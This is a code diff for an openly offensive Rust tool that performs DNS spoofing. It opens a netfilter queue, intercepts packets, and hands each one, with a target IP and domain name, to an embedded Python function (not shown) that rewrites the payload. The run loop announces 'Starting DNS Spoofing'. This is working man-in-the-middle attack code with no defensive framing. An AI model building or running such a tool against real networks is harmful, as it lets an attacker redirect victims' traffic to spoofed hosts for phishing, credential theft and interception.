@@ -1,80 +1,96 @@
-use std::thread;
-
+use std::{sync::atomic::{AtomicBool, Ordering}, sync::Arc};
 use nfq::{Queue, Verdict};
+use pyo3::{types::PyTuple, prelude::*};
 
-fn process_message(msg: &mut nfq::Message) -> Verdict
+fn process_message(msg: &mut nfq::Message, target_ip: String, domain_name: String) -> Verdict
 {
-    let mut verdict = Verdict::Accept;
+    let verdict = Verdict::Accept;
+    let data = msg.get_payload();
 
-    let mut data = msg.get_payload();
+    let py_app = include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/Python/pythonfuncs.py"));
+    let from_python = Python::with_gil(|py| -> Result<Vec<u8>, PyErr>{
+        let app: Py<PyAny> = PyModule::from_code(py, py_app, "pythonfuncs.py", "pythonfuncs")?
+            .getattr("process_packet")?
+            .into();
 
+        let args = PyTuple::new(py, &[domain_name.to_object(py), target_ip.to_object(py), data.to_object(py)]);
+        let run = app.call1(py, args)?.extract::<Vec<u8>>(py)?;
+        Ok(run)
+    });
+
+    match from_python
+    {
+        Ok(d) => 
+        {
+            if d.len() > 0
+            {
+                msg.set_payload(d);
+            }
+        },
+        Err(e) => 
+        {
+            println!("[!] Error from Python: {}", e);
+        }
+    }
 
     verdict
 }
 
-pub struct DNSSpoof
+pub fn run(target_ip: String, domain: String, running: &Arc<AtomicBool>) -> Result<(), std::io::Error>
 {
+    const QUEUE_NUMBER: u16 = 0;
 
-}
+    println!("[*] Starting DNS Spoofing");
 
-impl DNSSpoof
-{
-    pub fn new() -> Self
+    let mut queue = match Queue::open() 
     {
-        Self
-        {
+        Ok(q) => q,
+        Err(e) => return Err(std::io::Error::new(std::io::ErrorKind::Other, format!("Error opening queue: {}", e)))
+    };
 
+    match queue.bind(QUEUE_NUMBER)
+    {
+        Ok(_) => (),
+        Err(e) => return Err(std::io::Error::new(std::io::ErrorKind::Other, format!("Error binding queue {}", e)))
+    };
+        
+    loop 
+    {
+        let mut msg = match queue.recv()
+        {
+            Ok(m) => m,
+            Err(e) => 
+            {
+                println!("[!] Error receiving message: {}", e);
+                continue;
+            }
+        };
+
+        let verdict = process_message(&mut msg, target_ip.clone(), domain.clone());
+
+        msg.set_verdict(verdict);
+        match queue.verdict(msg)
+        {
+            Ok(_) => (),
+            Err(e) => 
+            {
+                println!("[!] Error setting verdict: {}", e);
+                continue;
+            }
+        }
+
+        if !running.load(Ordering::SeqCst) 
+        {
+            match queue.unbind(QUEUE_NUMBER)
+            {
+                Ok(_) => (),
+                Err(e) => return Err(std::io::Error::new(std::io::ErrorKind::Other, format!("Error unbinding queue {}", e)))
+            };
+            
+            break;
         }
     }
 
-    pub fn run(&self)
-    {
-        thread::spawn(move || {
-            loop
-            {
-                let mut queue = match Queue::open() 
-                {
-                    Ok(q) => q,
-                    Err(e) => 
-                    {
-                        println!("Error opening queue: {}", e);
-                        break;
-                    }
-                };
-
-                match queue.bind(1)
-                {
-                    Ok(_) => (),
-                    Err(e) => 
-                    {
-                        println!("Error binding: {}", e);
-                        break;
-                    }
-                };
-                
-                loop 
-                {
-                    let mut msg = match queue.recv()
-                    {
-                        Ok(m) => m,
-                        Err(e) => 
-                        {
-                            println!("Error: {}", e);
-                            continue;
-                        }
-                    };
-
-                    let verdict = process_message(&mut msg);
-
-                    msg.set_verdict(verdict);
-                    match queue.verdict(msg)
-                    {
-                        Ok(_) => (),
-                        Err(e) => println!("Error: {}", e),
-                    }
-                }
-            }
-        });
-    }
+    Ok(())
 }
 
